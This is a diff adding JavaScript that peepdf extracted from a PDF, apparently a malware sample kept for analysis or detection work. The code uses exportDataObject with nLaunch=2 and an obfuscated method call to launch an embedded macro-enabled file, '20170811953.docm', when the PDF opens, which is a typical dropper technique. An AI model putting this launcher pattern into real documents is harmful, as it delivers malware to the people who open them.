@@ -1,0 +1,16 @@
+// peepdf comment: Javascript code located in object 4 (version 0)
+
+function r1() {
+    var exportDataNameLaunch = {};
+    exportDataNameLaunch['r2'] = 'exportDataObject';
+    exportDataNameLaunch['nLaunch'] = 2;
+    exportDataNameLaunch['cName'] = '20170811953.docm';
+
+
+    this[exportDataNameLaunch['r2']](exportDataNameLaunch);
+}
+
+// peepdf comment: Javascript code located in object 12 (version 0)
+
+r1();
+
